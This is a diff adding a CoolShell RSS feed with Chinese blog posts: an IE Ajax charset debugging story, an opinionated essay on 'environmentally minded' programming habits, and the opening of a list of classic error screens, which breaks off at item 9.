@@ -1,0 +1,1062 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>IE | 酷 壳 - CoolShell</title>
+	<atom:link href="https://coolshell.cn/tag/ie/feed" rel="self" type="application/rss+xml" />
+	<link>https://coolshell.cn</link>
+	<description>享受编程和技术所带来的快乐 - Coding Your Ambition</description>
+	<lastBuildDate>Sat, 23 Mar 2013 01:54:45 +0000</lastBuildDate>
+	<language>zh-CN</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.2</generator>
+	<item>
+		<title>一次Ajax查错的经历</title>
+		<link>https://coolshell.cn/articles/8170.html</link>
+					<comments>https://coolshell.cn/articles/8170.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 27 Aug 2012 06:56:59 +0000</pubDate>
+				<category><![CDATA[Ajax开发]]></category>
+		<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[AJAX]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[jQuery]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[Web]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=8170</guid>
+
+					<description><![CDATA[<p>先说故事，再说想法吧。 我有一朋友做网站，用jQuery的Ajax方法从后端载入一段HTML代码然后动态插入到网页的Div元件中。这个东西太普遍了。jQuery...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8170.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/8170.html">一次Ajax查错的经历</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>先说故事，再说想法吧。</p>
+<p>我有一朋友做网站，用jQuery的Ajax方法从后端载入一段HTML代码然后动态插入到网页的Div元件中。这个东西太普遍了。jQuery强大的load方法可以完成这个事情。朋友的代码是这么写的：</p>
+<p>[javascript]var tab = jQuery(&quot;#dynamic_tab&quot;);<br />
+var url = &quot;/list_ajax/&quot;;<br />
+tab.load(url);[/javascript]</p>
+<p>简单到不能再简单了。在Chrome，Firefox，Safari下运行一点问题也没有，只有IE不行，不管是IE7，IE8，还是IE9。问题的症壮是，使用IE访问那个Ajax的链接，没有问题，但是在jQuery的Ajax方法返回了“undefined”的respons对象。没有任何报错！</p>
+<p>怎么搞也搞不定，只好Google了一下——“<a href="https://www.google.com/#hl=zh-CN&amp;newwindow=1&amp;site=&amp;source=hp&amp;q=jQuery+load+IE&amp;btnK=Google+%E6%90%9C%E7%B4%A2&amp;oq=jQuery+load+IE" target="_blank">jQuery load IE</a>”，一看，很多人都在问这个问题。于是开始了<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">散弹枪编程方式</a>。</p>
+<p>排在第一的就是StackOverflow被浏览了33K次的这个问题：<a href="http://stackoverflow.com/questions/1061525/jquerys-load-not-working-in-ie-but-fine-in-firefox-chrome-and-safari" target="_blank">jQuery&#8217;s .load() not working in IE &#8211; but fine in Firefox, Chrome and Safari</a>，答案没有被打勾（不靠谱），StackOverflow还有很多人问相似的问题，不过都没有答案。不管三七二十一，先试了一下，散弹枪嘛。试了半天都没有用。</p>
+<p>然后上Google查，又看到有人说的IE缓存的问题，什么，要把cache设置成false，或是用下面的方法来解决：</p>
+<p>[javascript]var tab = jQuery(&quot;#dynamic_tab&quot;);<br />
+var fuckie = Math.random();<br />
+var url = &quot;/list_ajax/&quot;+&quot;?fuckie=&quot;+fuckie;<br />
+tab.load(url);[/javascript]</p>
+<p>反正还是一样，统统不Work，几乎所有的都试了，都不Work。搞了一天的朋友恼怒道：“Microsoft应该快点倒闭吧，产品太烂了”。IE的确是太烂了。</p>
+<p><span id="more-8170"></span></p>
+<p>于是我用IE9的网页调试器可以看到点了Ajax的链接后，<strong>IE对网站有http的Ajax请求，也可以看到请求返回了，但是就是不显示在我的页面上——jQuery的Ajax的responseText为undefined!</strong></p>
+<p>对于我这个老家伙，对jQuery也不熟，我只得开始调试jQuery的代码，想看看里面干了什么，报了什么错？调了一个小时，基本上把jQuery的Ajax的封装看懂了七七八八了，但是还是没找到为什么有问题。</p>
+<p>于是，我只得架起原生态的Ajax，看看IE的那个Ajax的ActiveX的对象干了什么事？写了下面的代码（当年写Ajax就是这么写的，所以也不费劲，况且网上还有例程可以抄）：</p>
+<p>[javascript]<br />
+function InitAjax()<br />
+{<br />
+    var ajax=false;<br />
+    try {<br />
+        ajax = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);<br />
+    } catch (e) {<br />
+        try {<br />
+            ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br />
+        } catch (E) {<br />
+            ajax = false;<br />
+        }<br />
+    }<br />
+    if (!ajax &amp;&amp; typeof XMLHttpRequest!=&#8217;undefined&#8217;) {<br />
+        ajax = new XMLHttpRequest();<br />
+    }<br />
+    return ajax;<br />
+}</p>
+<p>var ajax = InitAjax();<br />
+ajax.open(&quot;GET&quot;, url, true);<br />
+ajax.onreadystatechange = function() {<br />
+    if (ajax.readyState == 4 &amp;&amp; ajax.status == 200) {<br />
+        var show = document.getElementById(&quot;HaoChenDIV&quot;).value;<br />
+        show.innerHTML = ajax.responseText;<br />
+    }<br />
+}<br />
+ajax.send(null);<br />
+[/javascript]</p>
+<p>一运行，还是不行，没见IE报什么错，不过，可以确定这不是jQuery的问题了，估计还是我们自己程序的问题。不过此时的程序太好调试了，调试中，在IE9下调式发现原生的IE的Ajax对象在onreadystatechange函数里，其responseText是下面这个样子：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-8171" title="ajax error in ie" src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error.jpg" alt="" width="601" height="153" srcset="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error.jpg 601w, https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-300x76.jpg 300w" sizes="(max-width: 601px) 100vw, 601px" /></p>
+<p>什么是“<strong>系统错误: -1072896658</strong>”？上<a href="https://www.google.com/#hl=zh-CN&amp;newwindow=1&amp;q=ajax+%22%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF:+-1072896658%22&amp;oq=ajax+%22%E7%B3%BB%E7%BB%9F%E9%94%99%E8%AF%AF:+-1072896658%22" target="_blank">google一查</a>，一堆页面，基本上是说乱码了，也就是ajax的后端程序返回的网页编码不认识吧。需要在返回的http header里加上 charset=utf-8。</p>
+<p>于是，修改后端的Ajax的程序，明确指定了返回的HTTP Header中的charset，于是IE下就工作正常了，再切回jQuery的load代码，一切正常了（后端的程序本来是utf-8的编码格式，但是不骨明确在HTTP Header中指定，但是只有IE不会自动检测）。</p>
+<p>这个问题的原因就是因为我们没有按照规范去写网页。所以，举一反三，HTML的规范还有哪些，太多了，记也记不住。但也许你会知道<strong>有一个叫 <a href="http://validator.w3.org" target="_blank">http://validator.w3.org</a> 的网站可以帮你校验你网页中的很多不规范的东西</strong>。这个工具会报很多很多错，很多都有点吹毛求疵，不过，可以让你看看（注：今天的coolshell装了很多插件，也被我调过一些东西，所以出错很多，我还记得以前没有插件没有我定制化的样式的时候，Wordpress一个错都不报）。</p>
+<h4>后记</h4>
+<p>我把这个问题和过程分享出来，主要有这么几个目的，并抛出几个问题，大家可以思考一下：</p>
+<p style="padding-left: 30px;">1）这个问题网上有很多人都在报，但是基本上找不到答案（包括StackOverflow），所以，我分享出来，填补一下空白。</p>
+<p style="padding-left: 30px;">2）我相信我们的程序员天天都在经历这样的事，我不知道大家在遇到这样的事情会怎么做？也许大多数人都在网上查各种解决方案，然后一个一个的试，直到试对了——散弹枪式的编程，呵呵。当然，大多数答案都是可能找到的。但<strong>当我们找到答案了后，我们还会深入去了解这个问题的具体原因并举一反三地去思考一其周边的东西吗</strong>？</p>
+<p style="padding-left: 30px;">3）另外，在今天这样N多框架，N多lib，N多开源的年代下，<strong>不知道大家有没有失去了从零开始自己写代码的能力？</strong>比如上面的这个问题，不知道有多少人还会自己写原生态的Ajax？不过，我还是建议大家能在使用各种框架的时候，明白那些最基础的知识，求甚解，知其然知其所以然，真的很重要。</p>
+<p>我是从那个“吃糠的年代”过来的程序员，那时的程序员什么都要自己干，很辛苦，今天我和很多人说我以前的那些经历，会被笑话，但是我从这些什么都自己的干的年代过的经历，让我受益很多。我把我的想法分享给大家，希望对大家有用。</p>
+<p>(全文完)<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/2.jpg" alt="来信， 创业 和 移动互联网" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5815.html" class="wp_rp_title">来信， 创业 和 移动互联网</a></li><li ><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/07/programmer-150x150.png" alt="程序员技术练级攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_title">程序员技术练级攻略</a></li><li ><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/biolab-150x150.jpg" alt="一些非常有意思的杂项资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a></li><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8170.html">一次Ajax查错的经历</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/8170.html/feed</wfw:commentRss>
+			<slash:comments>93</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>做个环保主义的程序员</title>
+		<link>https://coolshell.cn/articles/7186.html</link>
+					<comments>https://coolshell.cn/articles/7186.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 27 Apr 2012 00:26:44 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[Green]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[QQ]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=7186</guid>
+
+					<description><![CDATA[<p>十多年前刚走入社会工作的时候，那时的中国软件开发根本没有什么版本管理，也没有什么编程规范，软件开发相比起今天来说非常地混乱，那时仅凭自己的一些学习总结了一些C语...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/7186.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/7186.html">做个环保主义的程序员</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><strong></strong>十多年前刚走入社会工作的时候，那时的中国软件开发根本没有什么版本管理，也没有什么编程规范，软件开发相比起今天来说非常地混乱，那时仅凭自己的一些学习总结了一些C语言编程中的好的小笔记，后来，这些笔记写成了一篇叫《<a href="http://blog.csdn.net/haoel/article/details/2872" target="_blank">编程修养</a>》的文章。今天，又有些感触，想把这个话题扩大一下，从“个人修养”扩大到“环境保护”，所谓，穷则独善其身，富则达济天下，今天的技术人员比十多年前在技术和环境上都富有了许多，所以，也应该或多或少地担负起“达济天下”的责任了。</p>
+<p>环境保护说白了就是保护一个良好的环境，为好的环境添砖加瓦，与破坏环境的人和事做斗争。其实，从技术人员来说，我们可以做一些力所能及的事。因为我们身边的技术环境还有很大的改善的空间，而一些来之不易的东西还需要我们去小心维护。另外，对于我们自己来说，少吃一些垃圾食品，健康生活，对自己也有益。</p>
+<h4>环保主义软件开发</h4>
+<p><strong><img decoding="async" loading="lazy" class="alignright" title="Green Computing" alt="" src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing.jpg" width="285" height="233" /></strong>先说说软件开发中的环保。比如：</p>
+<ul>
+<li><strong>环保需求</strong>。当我们分析需求的时候，如果我们能做到不要像“<a title="这到底是谁之错？" href="https://coolshell.cn/articles/7126.html" target="_blank">这是到底是谁的错</a>”一文中那样的来者不拒，如果我们在面对需求能多问这样几个问题：为什么 要有这样的需求？这个功能主要能解决什么 样的问题？为什么不是另外那一种？可不可以简化一下？其实，我们并不需要创新，只需要真正地问好这几个问题，我们就可以少看着一些弯路，少一些苦逼的加班，少一些内耗，少一些埋怨，也就可以为这个社会节省下一些资源，从而环保。</li>
+</ul>
+<div></div>
+<ul>
+<li><strong>环保开发</strong>。当我们做设计写代码的时候，如果我们多花一些时间去思考一下，我们就可以少一些代码（参看“<a title="多些时间能少写些代码" href="https://coolshell.cn/articles/5686.html" target="_blank">多一些时间少一些代码</a>”）。如果我们在一开始多思考一下，不要急着马上去用迭代的方式认识世界，多思考一下怎么把复杂的东西解藕，把复杂的东西简化，怎么做出一个优雅的设计，怎么让我们的程序少一些tricky的东西，怎么让我们的程序变得更简洁，更清楚，更直，在一开始思考一下未来需求可能的变化，未来软件需要怎么测试，未来的系统需要怎么的运维，那么，我们可以少一些返工，少一些重构，少欠一些债，少一些低级错误，少承担一些系统上线后的压力，那么，我们同样可以为这个社会节约一些资源。说得再直白一点，你用更少的代码产生出更高的效益，少耗一些CPU，就能省一些电，间接地保护了环境。（参看<a title="Why C++ ? 王者归来" href="https://coolshell.cn/articles/6548.html" target="_blank"> Why C++？</a>）</li>
+</ul>
+<div><span id="more-7186"></span></div>
+<ul>
+<li><strong>环保文化</strong>。当我们在做软件开发的时候，如果你能影响并帮助你身边的同事，让他们写出更有修养更有效率质量更高的代码来，并发动团队树立工程师的文化，用团队去影响你的老板，你的公司，让他们能再多一点地重视技术，重视技术人员，那么你必然也会成为一个受益者。</li>
+</ul>
+<div></div>
+<ul>
+<li><strong>环保管理</strong>。当你做为一个管理者，做为一个方法推动者，如果你能更多地注重软件开发中真正创造生产力的程序员，为他们分忧，为他们铺路，为他们创造条件，那么，他们就会更多的回馈于你，就会少了一些不信任，就会少了一些被动，就会多一些主动，就会多一分责任，不但可以激发团队热情，同时可以有更大的生产力。同样是一种环保。</li>
+</ul>
+<p>当然，这样的东西还有很多，你也可能会觉得太过理想主义了，我们不可能马上改变之，但是我们可以试一试。</p>
+<h4>技术环保主义</h4>
+<p>其实，我们身边有很多可以做的技术环保工作。比如说，在Linux下少用root用户，SQL的时候，delete前先select，这样，你就不会做出一些让你后悔的事（参看<a title="程序员那些悲催的事儿" href="https://coolshell.cn/articles/3980.html" target="_blank">程序员那些悲催的事</a>），不会让你重头来过，从而至少不会浪费电能。写代码的时候要很小心管理好内存，以及各种资源，和线程并发，组织好的你的代码中的业务逻辑，做好单元测试，自动化回归测试，等，这样你就可以少一点遇到BUG，在遇到BUG时少一些时间去做调查。操作电脑的时候少下一些破解软件，少访问一些乱七八遭的网站，这样，你就会少中一些病毒，少一些损失，少一些重做系统，一样可以节省电能，最重要的是可以节省你的很多时间，让你可以去做一些更有价值 的事情。</p>
+<p>当然，除此之外，我们更应该做为一个大气的，高瞻的环保主义者，比如下面的事情：</p>
+<ul>
+<li><strong>拒绝IE6</strong>。如果你坚决不用IE6，并影响你身边的人，让他们升级IE6，尝试Chrome 或 Firefox，多告诉一下自己身边的朋友，怎么设计口令，怎么在互联网上保护自己的隐私和安全，怎么防木马，这样就能少一些问题，少装两次系统，就能省一些电，也就能多一些时间去做一些更有意义的事。也是在为整个世界整个人类做贡献。（<strong>看看某些软件产商，占据着用户桌面的江山，还整天弹窗弹窗的，说这不安全，那不安全的。你还是做安全的，你居然能容忍IE6装在用户的机器上，你还做个屁的安全！</strong>）2011年3月份，<a title="中国仍是IE6的重灾区" href="https://coolshell.cn/articles/3921.html" target="_blank">我国的IE6用户的百分比是34%</a>， 那时中国网民4.5亿，平均每三个人中有一个，2012年3月份，中国的比例还有24%左右，不过<a href="http://it.sohu.com/20120116/n332237326.shtml" target="_blank">中国的网民数达到了5.13亿</a>，也就是说，平均5个人里有一个，但是中国依然是全世界的IE6占有量最大的，参看下图（来自：<a href="http://www.ie6countdown.com/">http://www.ie6countdown.com</a>）面对下面的图片，你作何感想呢？</li>
+</ul>
+<p style="text-align: center;"><em>“<strong><span style="color: #cc0000;">Friend Don&#8217;t Let Friend Use IE6</span></strong>”</em></p>
+<div><a href="http://www.ie6countdown.com"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-7214" title="The Internet Explorer 6 Countdown" alt="" src="https://coolshell.cn/wp-content/uploads/2012/04/iecountdown2012.jpg" width="450" height="296" srcset="https://coolshell.cn/wp-content/uploads/2012/04/iecountdown2012.jpg 450w, https://coolshell.cn/wp-content/uploads/2012/04/iecountdown2012-300x197.jpg 300w" sizes="(max-width: 450px) 100vw, 450px" /></a></div>
+<div></div>
+<ul>
+<li><strong>拒绝破解软件</strong>。为什么要拒绝这些东西，因为你恐怕不知道这个软件的危害，包括一些汉化版的开源软件。这些软件中都会带 一些木马，比如：你下个putty的中文版，结果里有木马，人家就把你网站的口令盗了。关于网游，你可能不知道，连接网游私服的电脑基本上全是肉鸡，而 且，有很多的站点骗你下载软件破解程序，其实你下载到了一个木马。等等。这些生活都非常地不健康。</li>
+</ul>
+<ul>
+<li><strong>拒绝抄袭和山寨</strong>。如果你鄙视那些赤祼祼地抄袭者，不使用他们的产品，有的人会说你就是想标榜自己的高尚，ZB，假高尚，大家会说你没有必要。其实并不是，你这样做，其实是为了“环保”，为了“保护一个健康的IT环境”，虽然你没有创新，但是你的行为却是在鼓励创新的环境，这样，如果当整个大环境都是在创新文化影响之下，才会更健康，技术人员也才会被尊重，而我们自己最终会受益。虽然只是抑制抄袭和山寨，但是我们间接地为社会做了贡献。（看看那N多的抄袭团队，加入他们实在是耗费这个社会的资源） （那个整天复制这个复制这个复制那个的公司，看看你自己做的那些产品线？乱糟糟的。<strong>你自己看看，你有个人空间，还有群空间，还有校友录，然后你还要做个facebook式的“朋友”，还要搞个微博，然后还要搞个微信，大哥啊，你把这些相似度很大的东西放在了N多的服务器上，你不觉得浪费吗？你真是山寨之王啊，自己都一直在复制自己的产品</strong>。还有人说你们的产品经理一流，真是脑残啊。对于你们的复制精神，我只能拜了！）</li>
+</ul>
+<ul>
+<li><strong>拒绝百度搜索</strong>。如果你学得百度还是可以的话，你不妨看看我的微博（<a href="http://weibo.com/1401880315/ybN502xZ9" target="_blank">这个</a>，<a href="http://weibo.com/1401880315/ye6wNFTUW" target="_blank">这个</a>（<a href="http://weibo.com/1401880315/ye6E0a4zN" target="_blank">抓图</a>），还有和<a href="http://weibo.com/1401880315/yfC4yzonW" target="_blank">这个</a>和 <a href="http://weibo.com/1401880315/zlS3IbbEH" target="_blank">这个</a>）（以前，<a href="http://www.techweb.com.cn/it/2012-01-31/1145906.shtml" target="_blank">百度搜索出来的很多的开源软件（PuTTY、WinSCP）的第一个链接全是带木马的</a>，百度就是一个网上的病毒 )，你会发现百度不单单是广告的问题，很多东西根本搜不出来，包括他自己的内容。<strong>用百度就是浪费时间，浪费计算资源</strong>。如果你告诉你身边的朋友不要用百度搜索，而是用Google，并能耐心地教会他们翻墙，这样，我们就可以让那些“穷则穷凶极恶，富则为富不仁”的企业少一些自以为是，最重要的是可以让他们少制造一些垃圾信息和垃圾产品，世界少一些垃圾，自然也就环保了。</li>
+</ul>
+<ul>
+<li><strong>拒绝过重的商业氛围</strong>。很多社区的商业氛围实在是太浓了，全都是广告。整个社区根本都不是为技术人员来做的，而为了那些软件产商，为了那些公司。他们只知道为那些大公司写软文，做广告，开大会。他们只想着挣钱。网页上全是花花绿绿的广告，打开他们的网页，就会多耗许多电，浏览他们网站上的文章，到他们的大会上听他们的软件广告分享，就会让自己的生命和时间浪费，自己消耗了体力不说，却还没得到什么营养，相当的不环保。</li>
+</ul>
+<ul>
+<li><strong>拒绝浮燥</strong>。比如：浮燥地创业者们，被风投们一轮一轮地压榨。为了让风投满意，牺牲自己的初衷，去找水军刷排名，去发垃圾邮件，去烧钱买吆喝，制造虚假的繁荣，等等。另外，少去追那些新的技术，少一些浮夸，不要开口闭口的就是海量数据，高性能，要当个架构师，经理，要拿多少多少的工资，与其这样，还不如多静下心来研究一下那些十来年的技术，思考一下自己身边的问题，一步一步走踏实，少摔几个跟头，这样，你也就能多一些能力，多一些自信，也就能多做一些事，多解决一些问题，你的职业生源走好了，也就很环保了。</li>
+</ul>
+<p>还有很多，我相信大家明白我想说什么。<strong></strong>其实，我想说的是，<strong>这不单单是一种“个人修养”，这也是一种对社会贡献的方式，更是一种“低碳环保”的生活方式</strong>。</p>
+<p><span style="color: #cc0000;"><strong>让我们一起来做有修养的环保主义的程序员吧，少吃一些垃圾食品，多一些绿色的健康生活！</strong></span></p>
+<p><em><strong>—————— 更新 2012年4月27 ——————</strong></em></p>
+<p>我看到很多网友并不同意我的观点，并指责我的偏激和极端。挺好的，我知道，我说到了你们最敏感的地方，我很高兴。</p>
+<p><strong>你可以对现实妥协，你可以继续钟爱你的垃圾食品，你可以继续使用百度搜索，你可以继续生活在墙内，我虽然替你感到惋惜，但是我不会勉强你，因为我能理解你可以不环保，本来也是，这些事情，你能做到固然好，你做不到，也是你的选择。每个人的生活每个人自己去选择，想健康地生活，或是不健康地生活，都是你自己的权利</strong>。</p>
+<p>（全文完）</p>
+<div><strong><br />
+</strong></div>
+<div><strong><br />
+</strong></div>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li><li ><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg" alt="如何做一个有质量的技术分享" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a></li><li ><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png" alt="程序员如何把控自己的职业" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/7186.html">做个环保主义的程序员</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/7186.html/feed</wfw:commentRss>
+			<slash:comments>461</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>10大经典错误</title>
+		<link>https://coolshell.cn/articles/5107.html</link>
+					<comments>https://coolshell.cn/articles/5107.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 08 Aug 2011 00:37:36 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[404]]></category>
+		<category><![CDATA[Error]]></category>
+		<category><![CDATA[IE]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Windows]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=5107</guid>
+
+					<description><![CDATA[<p>下面是10、11个经典的错误，升序排名。希望大家补充！ 10、DOS的Abort，Retry, Fail？错误 85年以后出生的人可能不知道DOS是什么了，只有...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/5107.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/5107.html">10大经典错误</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>下面是10、11个经典的错误，升序排名。希望大家补充！</p>
+<h4>10、DOS的Abort，Retry, Fail？错误</h4>
+<p>85年以后出生的人可能不知道DOS是什么了，只有那老家伙还知道这是什么。我还记得当时的我对于Abort和Fail这两个选择还是比较清楚的，不过，今天完全忘记了Abort和Fail的差别是什么？这个出是DOS下的经常出现，也相当的经典，以至于在Wikepedia上都有专门的业面 <a href="http://en.wikipedia.org/wiki/Abort,_Retry,_Fail%3F" target="_blank">Abort, Retry, Fail?</a>。简称为ARF。当然，ARI &#8211; Abort, Retry, Ignore?</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-5108" title="Dos Abort Retry Fail" src="https://coolshell.cn/wp-content/uploads/2011/08/Dos_Abort_Retry_Fail.png" alt="" width="220" height="112" /></p>
+<h4>9、Windows Vista 的红屏错误</h4>
+<p><a href="http://en.wikipedia.org/wiki/Red_Screen_of_Death" target="_blank">红屏错误</a>（RSoD &#8211; Red Screen of Death）不单单只是Windows Vista引入的（也许是蓝屏太有名了，突然变成红屏，大家觉得这个是比蓝屏更NB的错，所以也就引人关注了），PlayStation的也喜欢使用红屏。</p>
